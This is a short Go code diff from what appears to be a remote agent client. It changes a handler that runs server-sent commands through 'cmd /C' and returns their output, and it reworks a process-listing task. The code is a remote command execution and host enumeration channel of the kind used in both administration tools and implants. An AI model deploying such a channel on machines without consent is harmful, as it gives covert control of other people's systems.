@@ -72,7 +72,7 @@ func executeTask(client *agent.Client, taskID int, type_ string, body map[string
 		out := exec.Command("cmd", "/C", command)
 		returnResult, err := out.Output()
 		if err != nil {
-			client.SendTaskResult(taskID, map[string]interface{}{"error": true, "msg": "Empty command is not allowed"})
+			client.SendTaskResult(taskID, map[string]interface{}{"error": true, "msg": err.Error()})
 		}
 
 		client.SendTaskResult(taskID, map[string]interface{}{
@@ -82,7 +82,21 @@ func executeTask(client *agent.Client, taskID int, type_ string, body map[string
 
 	case "proclist":
 		log.Println("Received proclist task", body)
-		windowsArray := ListWindows()
+		procs, err := Processes()
+		if err != nil {
+			client.SendTaskResult(taskID, map[string]interface{}{
+				"error": true,
+				"msg": err.Error(),
+			})
+			return
+		}
+		var windowsArray []Window
+		for _, v := range procs {
+			windowsArray = append(windowsArray, Window{
+				PID: v.Pid(),
+				Name: v.Executable(),
+			})
+		}
 		responseMap := map[string]interface{}{
 			"procs": windowsArray,
 		}
